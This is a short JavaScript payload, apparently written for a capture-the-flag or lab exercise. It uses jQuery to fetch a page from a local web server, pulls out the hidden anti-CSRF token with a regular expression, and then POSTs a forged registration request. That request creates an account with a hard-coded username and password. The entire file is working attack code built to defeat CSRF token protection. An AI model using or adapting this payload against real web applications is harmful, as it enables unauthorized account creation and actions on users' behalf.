document.write('Etape 1 franchie');

function start() {
   document.write('start');
   $.ajax({
       type: 'GET',
       url: 'http://127.0.0.1/index.php',
       contentType: 'application/x-www-form-urlencoded;charset=utf-8',
       dataType: 'text',
       data: '',
       success: extractToken
   });
}


function extractToken(response) {
   document.write('extract');
   var regex = new RegExp('<input type="hidden" name="token" value="(.*)"/>', 'gi');


   var token = response.match(regex);
   token = RegExp.$1;
   makeCSRF(token);
}

function makeCSRF(token) {
   $.ajax({
       type: "POST",
       url: "http://127.0.0.1/index.php",
       data: 'Rusername=shoxxuuuuu&Rpassword=shoxxuuuuu&token=' + token
   })
}
document.write('fuu');
start();
document.write('foo');
